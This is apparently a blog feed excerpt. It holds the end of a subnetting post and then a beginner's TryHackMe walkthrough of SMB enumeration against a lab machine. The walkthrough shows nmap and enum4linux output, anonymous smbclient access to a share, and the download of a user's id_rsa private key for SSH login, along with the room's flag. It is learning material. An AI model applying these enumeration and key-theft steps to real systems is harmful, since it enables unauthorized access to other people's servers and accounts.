<p>203.0.113.0/30 includes addresses from 203.0.113.0 to 203.0.113.3. When converted to binary, the IP addresses are as follows:</p>
<ul>
<li>203.0.113.0 = 11001011.00000000.01110001.00000000</li>
<li>203.0.113.1 = 11001011.00000000.01110001.00000001</li>
<li>203.0.113.2 = 11001011.00000000.01110001.00000010</li>
<li>203.0.113.3 = 11001011.00000000.01110001.00000011</li>
</ul>
<p>We assign 203.0.113.1 and 203.0.113.2 to R1 and R2, respectively. (Since this was a point-to-point network, we could also use /31 instead of /30 since poin-to-point networks do not need 2 extra addresses for network and broadcast addresses.)
Earlier, we mentioned that <code>/30</code> is a subnet of the <code>/24</code> address. So, what happens to the remaining addresses from 203.0.113.4 to 203.0.113.255 in the 203.0.113.0/24 network? These remaining addresses can be used in other subnets to prevent any waste of IP address.</p>
]]></content:encoded>
    </item>
    <item>
      <title>[THM] Network Services</title>
      <link>http://localhost:1313/thm-network-services/</link>
      <pubDate>Mon, 24 Jun 2024 00:00:00 +0000</pubDate><author>leewookb@gmail.com (Wook Lee)</author>
      <guid>http://localhost:1313/thm-network-services/</guid>
      <description>I have been indecisive about choosing between TryHackMe and Hack The Box Academy. Both are great platforms for learning about cybersecurity, and I plan to use both. However, I think TryHackMe is more suitable for absolute beginners like me. While exploring their Network Services rooms, I found myself learning a lot, so I decided to make a post about them.
SMB (Server Message Block) Protocol Understanding SMB What does SMB stand for?</description>
      <content:encoded><![CDATA[<p>I have been indecisive about choosing between TryHackMe and Hack The Box Academy. Both are great platforms for learning about cybersecurity, and I plan to use both. However, I think TryHackMe is more suitable for absolute beginners like me. While exploring their Network Services rooms, I found myself learning a lot, so I decided to make a post about them.</p>
<div style="text-align: center"><img src="./cat-hack.gif"></div>
<h3 id="smb-server-message-block-protocol">SMB (Server Message Block) Protocol</h3>
<hr>
<h4 id="understanding-smb">Understanding SMB</h4>
<p>What does SMB stand for?</p>






<pre tabindex="0"><code>Server Message Block</code></pre>
</br>
<p>What type of protocol is SMB?</p>






<pre tabindex="0"><code>resposne-request</code></pre>
</br>
<p>What do clients connect to servers using?</p>






<pre tabindex="0"><code>TCP/IP</code></pre>
<br>
<p>What systems does Samba run on?</p>






<pre tabindex="0"><code>Unix</code></pre>
<h4 id="enumerating-smb">Enumerating SMB</h4>
<p>Conduct an <code>nmap</code> scan of your choosing, How many ports are open?</p>






<pre tabindex="0"><code>3</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-210-52:~# nmap 10.10.190.95
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.60 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-24 05:55 BST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> ip-10-10-190-95.eu-west-1.compute.internal <span style="color:#89dceb;font-weight:bold">(</span>10.10.190.95<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.00047s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">997</span> closed ports
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT    STATE SERVICE
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>22/tcp  open  ssh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>139/tcp open  netbios-ssn
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>445/tcp open  microsoft-ds
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>MAC Address: 02:58:19:9C:D2:BD <span style="color:#89dceb;font-weight:bold">(</span>Unknown<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 1.76 seconds</span></span></code></pre></div>
<br>
<p>What port is SMB running on?</p>






<pre tabindex="0"><code>139/445</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>root@ip-10-10-210-52:~# nmap -sV 10.10.190.95
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>Starting Nmap 7.60 <span style="color:#89dceb;font-weight:bold">(</span> https://nmap.org <span style="color:#89dceb;font-weight:bold">)</span> at 2024-06-24 05:57 BST
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Nmap scan report <span style="color:#cba6f7">for</span> ip-10-10-190-95.eu-west-1.compute.internal <span style="color:#89dceb;font-weight:bold">(</span>10.10.190.95<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>Host is up <span style="color:#89dceb;font-weight:bold">(</span>0.00042s latency<span style="color:#89dceb;font-weight:bold">)</span>.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>Not shown: <span style="color:#fab387">997</span> closed ports
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>PORT    STATE SERVICE     VERSION
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#89dceb;font-weight:bold">(</span>Ubuntu Linux; protocol 2.0<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#89dceb;font-weight:bold">(</span>workgroup: WORKGROUP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>445/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style="color:#89dceb;font-weight:bold">(</span>workgroup: WORKGROUP<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>MAC Address: 02:58:19:9C:D2:BD <span style="color:#89dceb;font-weight:bold">(</span>Unknown<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Service Info: Host: POLOSMB; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">15</span><span>Nmap <span style="color:#cba6f7">done</span>: <span style="color:#fab387">1</span> IP address <span style="color:#89dceb;font-weight:bold">(</span><span style="color:#fab387">1</span> host up<span style="color:#89dceb;font-weight:bold">)</span> scanned in 13.04 seconds</span></span></code></pre></div>
<br>
<p>Let&rsquo;s get started with <code>Enum4Linux</code>, conduct a full basic enumeration. For starters, what is the <code>workgroup</code> name?</p>






<pre tabindex="0"><code>WORKGROUP</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-210-52:~# enum4linux -a 10.10.190.95</span></span></code></pre></div>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>	Server               Comment
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>	---------            -------
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>	Workgroup            Master
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>	---------            -------
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>	WORKGROUP            POLOSMB</span></span></code></pre></div>
<br>
<p>What comes up as the <code>name</code> of the machine?</p>






<pre tabindex="0"><code>POLOSMB</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>	Server               Comment
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>	---------            -------
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>	Workgroup            Master
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>	---------            -------
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>	WORKGROUP            POLOSMB</span></span></code></pre></div>
<br>
<p>What operating system <code>version</code> is running?</p>






<pre tabindex="0"><code>6.1</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span> <span style="color:#89dceb;font-weight:bold">======================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>|    OS information on 10.10.190.95    |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span> <span style="color:#89dceb;font-weight:bold">======================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>Use of uninitialized value <span style="color:#f5e0dc">$os_info</span> in concatenation <span style="color:#89dceb;font-weight:bold">(</span>.<span style="color:#89dceb;font-weight:bold">)</span> or string at /root/Desktop/Tools/Miscellaneous/enum4linux.pl line 464.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Got OS info <span style="color:#cba6f7">for</span> 10.10.190.95 from smbclient:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span><span style="color:#89dceb;font-weight:bold">[</span>+<span style="color:#89dceb;font-weight:bold">]</span> Got OS info <span style="color:#cba6f7">for</span> 10.10.190.95 from srvinfo:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>	POLOSMB        Wk Sv PrQ Unx NT SNT polosmb server <span style="color:#89dceb;font-weight:bold">(</span>Samba, Ubuntu<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>	platform_id     :	<span style="color:#fab387">500</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>	os version      :	6.1
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>	server <span style="color:#89dceb">type</span>     :	0x809a03</span></span></code></pre></div>
<br>
<p>What share sticks out as something we might want to investigate?</p>






<pre tabindex="0"><code>profiles</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span> <span style="color:#89dceb;font-weight:bold">=========================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>|    Share Enumeration on 10.10.190.95    |
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span> <span style="color:#89dceb;font-weight:bold">=========================================</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>WARNING: The <span style="color:#a6e3a1">&#34;syslog&#34;</span> option is deprecated
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>	Sharename       Type      Comment
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>	---------       ----      -------
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>	netlogon        Disk      Network Logon Service
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>	profiles        Disk      Users profiles
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>	print$          Disk      Printer Drivers
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>	IPC$            IPC       IPC Service <span style="color:#89dceb;font-weight:bold">(</span>polosmb server <span style="color:#89dceb;font-weight:bold">(</span>Samba, Ubuntu<span style="color:#89dceb;font-weight:bold">))</span></span></span></code></pre></div>
<br>
<h4 id="exploiting-smb">Exploiting SMB</h4>
<p>What would be the correct syntax to access an SMB share called &ldquo;secret&rdquo; as user &ldquo;suit&rdquo; on a machine with the IP 10.10.10.2 on the default port?</p>






<pre tabindex="0"><code>smbclient //10.10.10.2/secret -U suit -p 445</code></pre>
<p>We can remotely access the SMB share using the syntax:
<code>smbclient //[IP]/[SHARE]</code> followed by the tags:
-U [name]: to specify the user
-p [port]: to specify the port
SMB default ports are <code>139 or 445</code></p>
<br>
<p>Let&rsquo;s see if our interesting share has been configured to allow anonymous access, i,e it doesn&rsquo;t require authentication to view the files. We can do this easily by:</p>
<ul>
<li>using the username &ldquo;Anonymous&rdquo;</li>
<li>connecting to the share we found during the enumeration stage</li>
<li>and not supplying a password.</li>
</ul>
<p>Does the share allow anonymous access? Y/N?</p>






<pre tabindex="0"><code>Y</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>root@ip-10-10-210-52:~# smbclient //10.10.190.95/profiles -U Anonymous
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>WARNING: The <span style="color:#a6e3a1">&#34;syslog&#34;</span> option is deprecated
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>Enter WORKGROUP<span style="color:#89b4fa">\A</span>nonymous<span style="color:#f38ba8">&#39;</span>s password:
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>Try <span style="color:#a6e3a1">&#34;help&#34;</span> to get a list of possible commands.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>smb: <span style="color:#89b4fa">\&gt;</span></span></span></code></pre></div>
<br>
<p>Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?</p>






<pre tabindex="0"><code>John Cactus</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 1</span><span>smb: &gt; more <span style="color:#a6e3a1">&#34;Working From Home Information.txt&#34;</span>John Cactus,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 3</span><span>As you<span style="color:#f38ba8">&#39;</span>re well aware, due to the current pandemic most of POLO inc. has insisted that, wherever
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 4</span><span>possible, employees should work from home. As such- your account has now been enabled with ssh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 5</span><span>access to the main server.
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 7</span><span>If there are any problems, please contact the IT department at it@polointernalcoms.uk
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c"> 9</span><span>Regards,
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">11</span><span>James
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">12</span><span>Department Manager
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">13</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">14</span><span>/tmp/smbmore.aObMlQ <span style="color:#89dceb;font-weight:bold">(</span>END<span style="color:#89dceb;font-weight:bold">)</span></span></span></code></pre></div>
<br>
<p>What service has been configured to allow him to work from home?</p>






<pre tabindex="0"><code>ssh</code></pre>
<br>
<p>Okay! Now we know this, what directory on the share should we look in?</p>






<pre tabindex="0"><code>.ssh</code></pre>
<br>
<p>This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?</p>






<pre tabindex="0"><code>id_rsa</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>smb: <span style="color:#89b4fa">\&gt;</span> <span style="color:#89dceb">cd</span> .ssh
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>smb: <span style="color:#89b4fa">\.</span>ssh<span style="color:#89b4fa">\&gt;</span> ls
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>  .                                   D        <span style="color:#fab387">0</span>  Tue Apr <span style="color:#fab387">21</span> 12:08:23 <span style="color:#fab387">2020</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>  ..                                  D        <span style="color:#fab387">0</span>  Tue Apr <span style="color:#fab387">21</span> 12:08:23 <span style="color:#fab387">2020</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">5</span><span>  id_rsa                              A     <span style="color:#fab387">1679</span>  Tue Apr <span style="color:#fab387">21</span> 12:08:23 <span style="color:#fab387">2020</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">6</span><span>  id_rsa.pub                          N      <span style="color:#fab387">396</span>  Tue Apr <span style="color:#fab387">21</span> 12:08:23 <span style="color:#fab387">2020</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">7</span><span>  authorized_keys                     N        <span style="color:#fab387">0</span>  Tue Apr <span style="color:#fab387">21</span> 12:08:23 <span style="color:#fab387">2020</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">9</span><span>		<span style="color:#fab387">12316808</span> blocks of size 1024. <span style="color:#fab387">7583712</span> blocks available</span></span></code></pre></div>
<br>
<p>Download this file to your local machine, and change the permissions to &ldquo;600&rdquo; using &ldquo;chmod 600 [file]&rdquo;.</p>
<p>Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server.</p>
<p>What is the smb.txt flag?</p>






<pre tabindex="0"><code>THM{smb_is_fun_eh?}</code></pre>






<div class="highlight"><pre tabindex="0" style="color:#cdd6f4;background-color:#1e1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">1</span><span>smb: <span style="color:#89b4fa">\.</span>ssh<span style="color:#89b4fa">\&gt;</span> get id_rsa
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">2</span><span>getting file <span style="color:#89b4fa">\.</span>ssh<span style="color:#89b4fa">\i</span>d_rsa of size <span style="color:#fab387">1679</span> as id_rsa <span style="color:#89dceb;font-weight:bold">(</span>819.8 KiloBytes/sec<span style="color:#89dceb;font-weight:bold">)</span> <span style="color:#89dceb;font-weight:bold">(</span>average 819.8 KiloBytes/sec<span style="color:#89dceb;font-weight:bold">)</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">3</span><span>smb: <span style="color:#89b4fa">\.</span>ssh<span style="color:#89b4fa">\&gt;</span> <span style="color:#89dceb">exit</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f849c">4</span><span>root@ip-10-10-51-158:~# chmod <span style="color:#fab387">600</span> id_rsa</span></span></code></pre></div>






